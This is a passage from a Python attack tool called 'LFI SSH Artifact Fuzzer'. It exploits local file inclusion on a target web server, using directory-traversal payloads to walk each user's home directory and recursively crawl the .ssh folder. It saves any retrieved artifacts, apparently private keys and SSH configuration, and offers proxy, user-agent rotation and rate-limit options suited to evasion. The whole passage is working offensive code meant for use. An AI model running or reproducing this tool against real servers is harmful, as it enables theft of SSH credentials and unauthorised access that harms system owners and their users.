            self._print(f"[*] Scanning user {username}...", 'info')
            visited = set()
            
            # Check specific files
            for suffix in suffixes:
                suffix_clean = suffix.lstrip('/')
                full_path = config['traversal_prefix'] + clean_home_dir + suffix_clean
                self.recursive_fuzz(config['protocol'], config['host'], config['port'], 
                                   config['base_url'], config['encoding'], config['user_encoding'], 
                                   username, full_path, 0, config['max_depth'], visited, 
                                   config['lfi_type'], config['param_name'], config['verbose'])
            
            # Recursively scan .ssh directory
            ssh_dir_path = config['traversal_prefix'] + clean_home_dir + '.ssh/'
            self.recursive_fuzz(config['protocol'], config['host'], config['port'], 
                               config['base_url'], config['encoding'], config['user_encoding'], 
                               username, ssh_dir_path, 0, config['max_depth'], visited, 
                               config['lfi_type'], config['param_name'], config['verbose'])
        
        # Summary
        self._print("\n" + "="*60, 'highlight')
        self._print("[*] SCAN COMPLETE", 'highlight')
        self._print(f"Total requests: {self.request_count}", 'info')
        self._print(f"Artifacts found: {len(self.found_artifacts)}", 
                   'success' if self.found_artifacts else 'info')
        
        if self.found_artifacts:
            self._print("\nFound artifacts:", 'success')
            for artifact in self.found_artifacts:
                self._print(f"  • {artifact['user']}: {artifact['original_path']} -> {artifact['saved_path']}", 'info')


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description='LFI SSH Artifact Fuzzer', add_help=False)
    parser.add_argument('-h', '--help', action='store_true', help='Show help message')
    parser.add_argument('-adv', '--advanced', action='store_true', help='Enable advanced mode')
    parser.add_argument('--proxy', type=str, help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--rate', type=float, help='Rate limit in seconds between requests')
    parser.add_argument('--ua-file', type=str, help='File containing user agents')
    parser.add_argument('--cookies', type=str, help='Cookie string (e.g., "session=abc123")')
    parser.add_argument('--headers', type=str, help='Additional headers as JSON string')
    parser.add_argument('--timeout', type=int, help='Request timeout in seconds')
    parser.add_argument('--depth', type=int, help='Traversal depth for LFI payload')
    parser.add_argument('--max-depth', type=int, help='Max recursive directory depth')
    parser.add_argument('--dry-run', action='store_true', help='Test configuration without making requests')
    parser.add_argument('--output', type=str, help='Save results to JSON file')
    parser.add_argument('--no-color', action='store_true', help='Disable colored output')
    parser.add_argument('--no-redirect', action='store_true', help='Don\'t follow redirects')
    
    # Parse arguments
    args, unknown = parser.parse_known_args()
    
    # Initialize fuzzer
    fuzzer = LFI_SSH_Fuzzer(advanced_mode=args.advanced)
    
    # Handle help
    if args.help:
        fuzzer.show_help()
        sys.exit(0)
    
    # Disable colors if requested
    global COLORS
    if args.no_color:
        COLORS = False
        # Reset colors
        fuzzer.colors = {k: '' for k in fuzzer.colors.keys()}
    
    # Show banner
    fuzzer.show_banner()
    
    # Apply command-line configurations
    if args.proxy:
        fuzzer.config['proxy'] = args.proxy
    
    if args.rate:
        fuzzer.config['rate_limit'] = args.rate
    
    if args.ua_file and os.path.exists(args.ua_file):
        try:
            with open(args.ua_file, 'r', encoding='utf-8', errors='ignore') as f:
                agents = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            if agents:
                fuzzer.config['user_agents'] = agents
                fuzzer._print(f"[*] Loaded {len(agents)} user agents from {args.ua_file}", 'info')
        except Exception as e:
            fuzzer._print(f"[-] Error loading user agents: {e}", 'error')
    
    if args.cookies:
        try:
            cookies = {}
            for cookie in args.cookies.split(';'):
                if '=' in cookie:
                    key, value = cookie.strip().split('=', 1)
                    cookies[key] = value
            fuzzer.config['cookies'] = cookies
        except:
            fuzzer._print("[-] Invalid cookie format", 'error')
    
    if args.headers:
        try:
            fuzzer.config['headers'] = json.loads(args.headers)
        except json.JSONDecodeError:
            fuzzer._print("[-] Invalid JSON in headers", 'error')
    
    if args.timeout:
        fuzzer.config['timeout'] = args.timeout
    
    if args.depth:
        fuzzer.config['traversal_depth'] = args.depth
    
    if args.max_depth:
        fuzzer.config['max_depth'] = args.max_depth
    
    if args.no_redirect:
        fuzzer.config['follow_redirects'] = False
    
    # Interactive setup
    config = fuzzer.interactive_setup(args)
    
    # Run scan
    fuzzer.run_scan(config, dry_run=args.dry_run)
    
    # Save results if requested
    if args.output and not args.dry_run:
        fuzzer.save_results(args.output)
    elif not args.dry_run and fuzzer.found_artifacts:
        # Ask if user wants to save results
        save_choice = input("\nSave results to file? (y/N): ").strip().lower()
        if save_choice == 'y':
            filename = input("Filename (default: scan_results.json): ").strip()
            fuzzer.save_results(filename if filename else None)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        if '--verbose' in sys.argv:
            import traceback
            traceback.print_exc()
        sys.exit(1)
